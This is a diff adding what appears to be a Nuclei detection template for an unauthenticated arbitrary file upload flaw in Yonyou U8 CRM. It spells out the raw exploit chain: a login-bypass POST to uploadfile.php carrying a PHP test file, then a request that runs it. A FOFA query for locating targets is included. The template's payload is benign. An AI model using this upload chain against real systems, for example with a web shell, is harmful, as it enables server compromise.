@@ -1,0 +1,53 @@
+id: yonyou-crm-arbitrary-file-upload
+
+info:
+  name: Yonyou CRM - Arbitrary File Upload
+  author: Co5mos
+  severity: high
+  description: 用友CRM系统的uploadfile.php接口存在任意文件上传漏洞，攻击者可通过该漏洞上传任意文件。
+  metadata:
+    fofa-query: app="用友U8CRM"
+  tags: yonyou,crm,fileupload
+
+http:
+  - raw:
+    - |
+      POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
+      Host: {{Hostname}}
+      Connection: close
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+      ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+      Content-Disposition: form-data; name="file"; filename="%s.php "
+      Content-Type: application/octet-stream
+
+      <?php print(1111*2222);unlink(__FILE__);?>
+      ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+      Content-Disposition: form-data; name="upload"
+
+      upload
+      ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+
+    - |
+      GET /tmpfile/{{uploadfile}} HTTP/1.1
+      Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        name: uploadfile
+        regex:
+          - '(upd\w+\.tmp\.php)'
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '2468642'
+
+      - type: status
+        status:
+          - 200
